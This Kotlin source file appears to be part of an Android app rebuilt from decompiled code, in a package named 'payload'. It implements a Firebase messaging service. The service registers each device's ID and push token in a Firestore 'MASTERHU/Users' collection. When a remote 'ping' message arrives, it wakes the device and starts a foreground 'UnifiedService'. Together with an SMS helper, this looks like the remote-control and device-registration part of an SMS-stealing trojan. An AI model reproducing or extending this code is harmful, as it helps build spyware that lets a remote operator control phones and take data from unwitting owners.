package com.payload.jansiix0ne.services

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Service for handling Firebase Cloud Messaging
 */
class MyFirebaseMessagingService : FirebaseMessagingService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        
        Log.d(TAG, "FCM message received: ${remoteMessage.data}")
        
        // Check if it's a ping message
        if (remoteMessage.data.containsKey("ping") || 
            remoteMessage.data["type"] == "ping") {
            Log.d(TAG, "✅ Received FCM ping — waking device & starting UnifiedService")
            
            serviceScope.launch {
                wakeDeviceAndStartService()
            }
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "Refreshed token: $token")
        
        // Upload token to Firestore - مطابق کد decompiled: C2862b.java و m4893e
        serviceScope.launch {
            uploadTokenToFirestore(token)
        }
    }
    
    /**
     * Upload FCM token to Firestore
     * Based on decompiled code: m4893e method
     * Path: MASTERHU/Users/{deviceId}
     */
    private suspend fun uploadTokenToFirestore(token: String) {
        try {
            val deviceId = com.payload.jansiix0ne.util.SmsHelper.getDeviceId(applicationContext)
            val firestoreRepository = com.payload.jansiix0ne.data.repository.FirestoreRepository()
            
            val result = firestoreRepository.saveFcmToken(deviceId, token)
            
            if (result.isSuccess) {
                Log.d(TAG, "FCM token updated for $deviceId")
            } else {
                Log.e(TAG, "Failed to update token: ${result.exceptionOrNull()?.message}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update token: ${e.message}", e)
        }
    }

    private suspend fun wakeDeviceAndStartService() {
        try {
            val intent = Intent(applicationContext, UnifiedService::class.java)
            applicationContext.startForegroundService(intent)
            Log.d(TAG, "UnifiedService start command sent")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start UnifiedService: ${e.message}", e)
        }
    }

    companion object {
        private const val TAG = "MyFirebaseMessagingService"
    }
}
